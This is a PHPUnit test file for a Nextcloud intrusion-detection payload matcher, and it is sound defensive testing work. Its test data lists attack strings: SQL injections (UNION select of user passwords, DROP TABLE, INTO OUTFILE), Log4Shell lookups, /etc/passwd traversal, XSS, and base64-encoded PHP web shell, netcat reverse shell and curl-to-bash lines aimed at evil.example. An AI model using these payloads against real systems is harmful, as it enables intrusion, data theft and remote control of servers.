<?php

declare(strict_types=1);

/**
 * SPDX-FileCopyrightText: 2026 Nextcloud GmbH and Nextcloud contributors
 * SPDX-License-Identifier: AGPL-3.0-or-later
 */

namespace OCA\IntrusionDetection\Tests\Unit\Check\Payload;

use OCA\IntrusionDetection\Check\Payload\Base64Inspector;
use OCA\IntrusionDetection\Check\Payload\CustomSignatures;
use OCA\IntrusionDetection\Check\Payload\FormMatch;
use OCA\IntrusionDetection\Check\Payload\Normalizer;
use OCA\IntrusionDetection\Check\Payload\PayloadMatcher;
use OCA\IntrusionDetection\Check\Payload\PayloadRules;
use OCA\IntrusionDetection\Tests\Integration\PayloadCorpus;
use PHPUnit\Framework\Attributes\DataProvider;
use Test\TestCase;

class PayloadMatcherTest extends TestCase {
	private PayloadMatcher $matcher;

	protected function setUp(): void {
		parent::setUp();
		$this->matcher = new PayloadMatcher(new Normalizer(), new Base64Inspector());
	}

	/**
	 * @param list<string> $disabled
	 * @param list<string> $custom
	 */
	private function rules(int $minWeight = 3, array $disabled = [], array $custom = []): PayloadRules {
		return PayloadRules::build($minWeight, 8192, $disabled, $custom, []);
	}

	/**
	 * @return array<string, array{string, list<string>, string}>
	 */
	public static function hits(): array {
		return [
			'tautology' => ["1' OR '1'='1", ['sql_tautology'], FormMatch::ENCODING_NONE],
			'union' => ['1 UNION ALL SELECT username,password FROM oc_users', ['sql_union_select', 'sql_select_from'], FormMatch::ENCODING_NONE],
			'comment evasion' => ['1/**/UNION/**/SELECT/**/1,2,3', ['sql_union_select'], FormMatch::ENCODING_NONE],
			'executable comment' => ['1 /*!50000UNION*/ /*!50000SELECT*/ 1', ['sql_union_select'], FormMatch::ENCODING_NONE],
			'waitfor' => ["1;WAITFOR DELAY '0:0:5'--", ['sql_waitfor', 'sql_quote_terminator', 'sql_trailing_comment'], FormMatch::ENCODING_NONE],
			'sleep' => ['1 AND SLEEP(5)', ['sql_sleep'], FormMatch::ENCODING_NONE],
			'pg_sleep' => ['1 AND pg_sleep(5)', ['sql_sleep'], FormMatch::ENCODING_NONE],
			'error-based' => ['1 AND extractvalue(1,concat(0x7e,version()))', ['sql_error_function'], FormMatch::ENCODING_NONE],
			'schema' => ['1 AND 1=1 UNION SELECT table_name FROM information_schema.tables', ['sql_union_select', 'sql_numeric_tautology', 'sql_schema', 'sql_select_from'], FormMatch::ENCODING_NONE],
			'numeric tautology with a comment' => ['1 or 1=1--', ['sql_numeric_tautology', 'sql_trailing_comment'], FormMatch::ENCODING_NONE],
			'stacked query' => ['1; DROP TABLE oc_users; SELECT 1 FROM x', ['sql_stacked_query', 'sql_select_from'], FormMatch::ENCODING_NONE],
			'into outfile' => ["1 INTO OUTFILE '/var/www/x.php'", ['sql_file_write'], FormMatch::ENCODING_NONE],
			'Log4Shell in plain text' => ['${jndi:ldap://evil.example/a}', ['payload_log4shell'], FormMatch::ENCODING_NONE],
			'Log4Shell obfuscated' => ['${${lower:j}ndi:ldap://x}', ['payload_log4shell'], FormMatch::ENCODING_NONE],
			'passwd file' => ['../../../../etc/passwd', ['payload_system_file'], FormMatch::ENCODING_NONE],
			'script tag' => ['<script>alert(1)</script>', ['payload_script_tag'], FormMatch::ENCODING_NONE],
			'base64 SQL' => ['JyBPUiAnMSc9JzE=', ['sql_tautology'], FormMatch::ENCODING_BASE64],
			'base64 PHP' => ['PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==', ['payload_php_tag', 'payload_php_exec'], FormMatch::ENCODING_BASE64],
			'base64 traversal' => [base64_encode('../../../../var/www/config.php'), ['payload_path_traversal'], FormMatch::ENCODING_BASE64],
			'base64 shell' => [base64_encode('foo; bash -c "id"'), ['payload_shell_exec'], FormMatch::ENCODING_BASE64],
			'base64 netcat' => [base64_encode('nc -e /bin/sh evil.example 4444'), ['payload_netcat'], FormMatch::ENCODING_BASE64],
			'base64 curl to bash' => [base64_encode('curl -s https://evil.example/x.sh | bash'), ['payload_shell_download'], FormMatch::ENCODING_BASE64],
			'base64 event handler' => [base64_encode('<img src=x onerror=alert(1)>'), ['payload_event_handler'], FormMatch::ENCODING_BASE64],
			'base64 javascript link' => [base64_encode('javascript:alert(document.cookie)'), ['payload_javascript_uri'], FormMatch::ENCODING_BASE64],
			'base64 eval' => [base64_encode('eval($_POST["x"]);'), ['payload_php_eval'], FormMatch::ENCODING_BASE64],
			'base64 decode' => [base64_encode('echo base64_decode("cGhw");'), ['payload_php_decode'], FormMatch::ENCODING_BASE64],
			'double base64' => [base64_encode(base64_encode("' OR '1'='1")), ['sql_tautology'], FormMatch::ENCODING_BASE64_TWICE],
			'base64 with spaces from a form' => [str_replace('+', ' ', base64_encode("1' or '1'='1' -- >?")), ['sql_tautology', 'sql_quote_terminator'], FormMatch::ENCODING_BASE64],
		];
	}

	/**
	 * @param list<string> $expected
	 */
	#[DataProvider('hits')]
	public function testFires(string $value, array $expected, string $encoding): void {
		$analysis = $this->matcher->analyse($value, $this->rules());
		$this->assertTrue($analysis->fires(), 'Weight was ' . $analysis->strongest()->weight);
		$form = $analysis->strongest();
		$this->assertSame($encoding, $form->encoding);
		foreach ($expected as $id) {
			$this->assertArrayHasKey($id, $form->matches);
		}
	}

	/**
	 * @param string $value
	 */
	#[DataProvider('harmless')]
	public function testDoesNotFire(string $value): void {
		$analysis = $this->matcher->analyse($value, $this->rules());
		$this->assertFalse($analysis->fires(), json_encode($analysis->strongest()->matches) ?: '');
	}

	/**
	 * @return array<string, array{string}>
	 */
	public static function harmless(): array {
		return PayloadCorpus::harmlessValues();
	}

	public function testALoneQuoteOrCommentNeverFires(): void {
		$this->assertSame(1, $this->matcher->analyse("admin'--", $this->rules())->strongest()->weight - 1);
		$this->assertFalse($this->matcher->analyse("admin'--", $this->rules())->fires());
	}

	public function testPayloadSignaturesForDecodedTextDoNotRunOnPlainText(): void {
		$this->assertFalse($this->matcher->analyse('../../docs', $this->rules())->fires());
		$this->assertFalse($this->matcher->analyse('javascript: the good parts', $this->rules())->fires());
	}

	public function testHexCountsOnlyWithAnotherSignature(): void {
		$this->assertSame([], $this->matcher->analyse('0xdeadbeefcafe', $this->rules(2))->strongest()->matches);
		$matches = $this->matcher->analyse("0xdeadbeefcafe'--", $this->rules(2))->strongest()->matches;
		$this->assertArrayHasKey('sql_hex_literal', $matches);
	}

	public function testMinimumWeightIsConfigurable(): void {
		$this->assertFalse($this->matcher->analyse('1 or 1=1', $this->rules(3))->fires());
		$this->assertTrue($this->matcher->analyse('1 or 1=1', $this->rules(2))->fires());
		$this->assertFalse($this->matcher->analyse('1 UNION SELECT 1', $this->rules(4))->fires());
	}

	public function testDisabledSignaturesDoNotRun(): void {
		$rules = $this->rules(3, ['sql_union_select']);
		$this->assertFalse($this->matcher->analyse('1 UNION SELECT 1', $rules)->fires());
		$this->assertTrue($this->matcher->analyse("1' OR '1'='1", $rules)->fires());
	}

	public function testCustomSignaturesRun(): void {
		$rules = $this->rules(3, [], ['dbms_pipe\.receive_message', '1:harmless']);
		$analysis = $this->matcher->analyse("DBMS_PIPE.RECEIVE_MESSAGE('a',5)", $rules);
		$this->assertTrue($analysis->fires());
		$this->assertArrayHasKey(CustomSignatures::idFor('dbms_pipe\.receive_message'), $analysis->strongest()->matches);
		$this->assertFalse($this->matcher->analyse('harmless', $rules)->fires(), 'A custom signature has its own weight');
		$disabled = $this->rules(3, [CustomSignatures::idFor('dbms_pipe\.receive_message')], ['dbms_pipe\.receive_message']);
		$this->assertFalse($this->matcher->analyse("DBMS_PIPE.RECEIVE_MESSAGE('a',5)", $disabled)->fires());
	}

	public function testABrokenOrSlowCustomSignatureCountsAsNoMatch(): void {
		$rules = $this->rules(3, [], ['union(select', '(a+)+$']);
		$this->assertCount(count($this->rules()->signatures) + 1, $rules->signatures, 'One that does not compile is dropped');
		$this->assertFalse($this->matcher->analyse(str_repeat('a', 5000) . 'b', $rules)->fires());
		$this->assertTrue($this->matcher->analyse('1 UNION SELECT 1', $rules)->fires());
	}

	public function testExcerptIsShortCleanAndAroundTheMatch(): void {
		$value = str_repeat('x', 500) . "%01%02\x7f' OR '1'='1 " . str_repeat('é', 300);
		$form = $this->matcher->analyse($value, $this->rules())->strongest();
		$excerpt = PayloadMatcher::excerpt($form);
		$this->assertLessThanOrEqual(PayloadMatcher::EXCERPT_LENGTH, mb_strlen($excerpt));
		$this->assertDoesNotMatchRegularExpression('/[\x00-\x1f\x7f]/', $excerpt);
		$this->assertStringContainsString("' or '1'='1", $excerpt);
		$this->assertTrue(mb_check_encoding($excerpt, 'UTF-8'));
		$this->assertNotFalse(json_encode($excerpt));
	}

	public function testExcerptOfInvalidUtf8IsValid(): void {
		$form = $this->matcher->analyse("\xff\xfe' OR '1'='1\xc3", $this->rules())->strongest();
		$this->assertTrue(mb_check_encoding(PayloadMatcher::excerpt($form), 'UTF-8'));
	}
}
